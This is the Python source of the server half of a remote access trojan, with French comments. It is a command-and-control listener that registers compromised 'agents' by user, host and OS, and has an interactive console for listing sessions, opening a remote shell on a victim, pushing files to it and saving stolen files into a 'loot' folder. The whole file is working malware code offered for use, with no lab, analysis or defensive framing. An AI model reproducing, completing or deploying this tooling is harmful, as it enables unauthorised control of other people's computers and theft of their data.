"""Serveur RAT — écoute TCP multi-agents avec CLI interactive."""

import argparse
import base64
import logging
import socket
import threading
from pathlib import Path
from typing import Any

from .crypto import CryptoHandler, generate_key
from .protocol import Protocol

logger = logging.getLogger(__name__)

DEFAULT_HOST = "0.0.0.0"
DEFAULT_PORT = 8888
LOOT_DIR = Path("loot")


class Agent:
    """Représente un client/agent connecté."""

    def __init__(
        self,
        agent_id: int,
        sock: socket.socket,
        address: tuple[str, int],
        protocol: Protocol,
        info: dict[str, str],
    ):
        self.id = agent_id
        self.sock = sock
        self.address = address
        self.protocol = protocol
        self.hostname = info.get("hostname", "inconnu")
        self.os_name = info.get("os", "inconnu")
        self.user = info.get("user", "inconnu")
        self.alive = True

    def __str__(self) -> str:
        return (
            f"Agent {self.id} | {self.user}@{self.hostname} "
            f"({self.os_name}) | {self.address[0]}:{self.address[1]}"
        )


class Server:
    """Serveur C2 multi-agents avec interface interactive."""

    def __init__(self, host: str, port: int, key: bytes):
        self._host = host
        self._port = port
        self._crypto = CryptoHandler(key)
        self._sock: socket.socket | None = None
        self._agents: dict[int, Agent] = {}
        self._agent_counter = 0
        self._lock = threading.Lock()
        self._running = False
        self._current_agent: Agent | None = None

    def start(self) -> None:
        """Démarre le serveur : listener + CLI interactive."""
        self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        self._sock.bind((self._host, self._port))
        self._sock.listen(5)
        self._running = True

        LOOT_DIR.mkdir(exist_ok=True)

        listener = threading.Thread(target=self._accept_loop, daemon=True)
        listener.start()
        logger.info("Serveur démarré sur %s:%d", self._host, self._port)

        self._cli()

    def _accept_loop(self) -> None:
        """Boucle d'acceptation des connexions entrantes (thread dédié)."""
        while self._running:
            try:
                self._sock.settimeout(1.0)
                try:
                    client_sock, address = self._sock.accept()
                except TimeoutError:
                    continue

                protocol = Protocol(client_sock, self._crypto)
                info = protocol.recv()
                if info is None or info.get("type") != "info":
                    logger.warning("Connexion rejetée depuis %s", address)
                    client_sock.close()
                    continue

                with self._lock:
                    self._agent_counter += 1
                    agent = Agent(self._agent_counter, client_sock, address, protocol, info)
                    self._agents[agent.id] = agent

                logger.info("Nouvel agent : %s", agent)
                print(f"\n[+] Agent connecté : {agent}")

            except OSError:
                break
            except Exception as exc:
                if self._running:
                    logger.error("Erreur accept : %s", exc)

    def _remove_agent(self, agent_id: int) -> None:
        """Déconnecte et retire un agent."""
        with self._lock:
            agent = self._agents.pop(agent_id, None)
        if agent:
            agent.alive = False
            try:
                agent.sock.close()
            except Exception:
                pass
            logger.info("Agent retiré : %s", agent)

    # ── CLI ──────────────────────────────────────────────────────────

    def _cli(self) -> None:
        """Boucle principale de l'interface en ligne de commande."""
        print(f"[*] Écoute sur {self._host}:{self._port}...")
        print("[*] Tapez 'help' pour les commandes disponibles\n")

        while self._running:
            try:
                prompt = (
                    f"rat agent {self._current_agent.id} > " if self._current_agent else "rat > "
                )
                user_input = input(prompt).strip()
                if not user_input:
                    continue

                if self._current_agent:
                    self._handle_agent_input(user_input)
                else:
                    self._handle_server_input(user_input)

            except (KeyboardInterrupt, EOFError):
                print("\n[*] Arrêt du serveur...")
                self._running = False

    def _handle_server_input(self, user_input: str) -> None:
        """Traite une commande du menu principal."""
        parts = user_input.split()
        command = parts[0].lower()

        if command == "help":
            print("Commandes serveur :")
            print("  sessions          Lister les agents connectés")
            print("  interact <id>     Interagir avec un agent")
            print("  kill <id>         Déconnecter un agent")
            print("  exit              Arrêter le serveur")

        elif command == "sessions":
            with self._lock:
                if not self._agents:
                    print("[*] Aucun agent connecté")
                else:
                    for agent in self._agents.values():
                        print(f"  [*] {agent}")

        elif command == "interact":
            if len(parts) < 2:
                print("[!] Usage : interact <id>")
                return
            try:
                agent_id = int(parts[1])
            except ValueError:
                print("[!] ID invalide")
                return
            with self._lock:
                agent = self._agents.get(agent_id)
            if agent and agent.alive:
                self._current_agent = agent
                print(f"[*] Interaction avec {agent}")
                print("[*] Tapez 'help' pour les commandes, 'back' pour revenir")
            else:
                print(f"[!] Agent {agent_id} introuvable")

        elif command == "kill":
            if len(parts) < 2:
                print("[!] Usage : kill <id>")
                return
            try:
                agent_id = int(parts[1])
            except ValueError:
                print("[!] ID invalide")
                return
            if agent_id in self._agents:
                self._remove_agent(agent_id)
                print(f"[*] Agent {agent_id} déconnecté")
            else:
                print(f"[!] Agent {agent_id} introuvable")

        elif command == "exit":
            self._running = False

        else:
            print(f"[!] Commande inconnue : {command}. Tapez 'help'")

    def _handle_agent_input(self, user_input: str) -> None:
        """Traite une commande destinée à un agent."""
        if user_input.lower() == "back":
            self._current_agent = None
            return

        parts = user_input.split()
        command = parts[0].lower()
        args = parts[1:]
        agent = self._current_agent

        # Shell interactif
        if command == "shell" and not args:
            self._interactive_shell(agent)
            return

        try:
            if command == "upload" and len(args) >= 1:
                self._send_upload(agent, args)
            else:
                agent.protocol.send_command(command, args)

            response = agent.protocol.recv()
            if response is None:
                print(f"[!] Agent {agent.id} déconnecté")
                self._remove_agent(agent.id)
                self._current_agent = None
                return

            self._display_response(response)

        except Exception as exc:
            logger.error("Erreur communication agent : %s", exc)
            print(f"[!] Erreur : {exc}")
            self._remove_agent(agent.id)
            self._current_agent = None

    def _interactive_shell(self, agent: Agent) -> None:
        """Mode shell interactif — chaque ligne est exécutée sur l'agent."""
        print("[*] Shell interactif ouvert. Tapez 'exit' pour revenir.")
        while True:
            try:
                shell_input = input("$ ").strip()
            except (KeyboardInterrupt, EOFError):
                print()
                break

            if not shell_input:
                continue
            if shell_input.lower() == "exit":
                break

            try:
                agent.protocol.send_command("shell", [shell_input])
                response = agent.protocol.recv()
                if response is None:
                    print(f"[!] Agent {agent.id} déconnecté")
                    self._remove_agent(agent.id)
                    self._current_agent = None
                    break
                print(response.get("data", ""))
            except Exception as exc:
                print(f"[!] Erreur : {exc}")
                break

    def _send_upload(self, agent: Agent, args: list[str]) -> None:
        """Lit un fichier local et l'envoie à l'agent."""
        local_path = args[0]
        remote_path = args[1] if len(args) >= 2 else args[0]
        try:
            file_data = Path(local_path).read_bytes()
        except FileNotFoundError:
            print(f"[!] Fichier local introuvable : {local_path}")
            return
        except Exception as exc:
            print(f"[!] Erreur lecture : {exc}")
            return

        encoded = base64.b64encode(file_data).decode()
        agent.protocol.send_command("upload", [remote_path], encoded)

    def _display_response(self, response: dict[str, Any]) -> None:
        """Affiche la réponse d'un agent."""
        status = response.get("status", "success")
        data = response.get("data", "")
        filename = response.get("filename")

        if filename:
            save_path = self._unique_path(LOOT_DIR / filename)
            file_data = base64.b64decode(data)
            save_path.write_bytes(file_data)
            print(f"[+] Fichier sauvegardé : {save_path} ({len(file_data)} octets)")
        elif status == "error":
            print(f"[!] {data}")
        else:
            print(data)

    @staticmethod
    def _unique_path(path: Path) -> Path:
        """Retourne un chemin unique en ajoutant un suffixe si nécessaire."""
        if not path.exists():
            return path
        counter = 1
        while True:
            candidate = path.with_stem(f"{path.stem}_{counter}")
            if not candidate.exists():
                return candidate
            counter += 1

    def stop(self) -> None:
        """Arrête proprement le serveur et tous les agents."""
        self._running = False
        with self._lock:
            for agent in self._agents.values():
                try:
                    agent.protocol.send_command("exit")
                except Exception:
                    pass
                try:
                    agent.sock.close()
                except Exception:
                    pass
            self._agents.clear()
        if self._sock:
            try:
                self._sock.close()
            except Exception:
                pass
        logger.info("Serveur arrêté")


def main() -> None:
    parser = argparse.ArgumentParser(description="RAT Serveur")
    parser.add_argument("--host", default=DEFAULT_HOST, help="Adresse d'écoute")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Port d'écoute")
    parser.add_argument("--key", help="Clé Fernet (générée si absente)")
    args = parser.parse_args()

    logging.basicConfig(
        level=logging.INFO,
        format="%(asctime)s [%(levelname)s] %(name)s: %(message)s",
    )

    if args.key:
        key = args.key.encode()
    else:
        key = generate_key()
        print(f"[*] Clé générée : {key.decode()}")
        print("[*] Utilisez cette clé pour démarrer le client\n")

    server = Server(args.host, args.port, key)
    try:
        server.start()
    except KeyboardInterrupt:
        pass
    finally:
        server.stop()


if __name__ == "__main__":
    main()
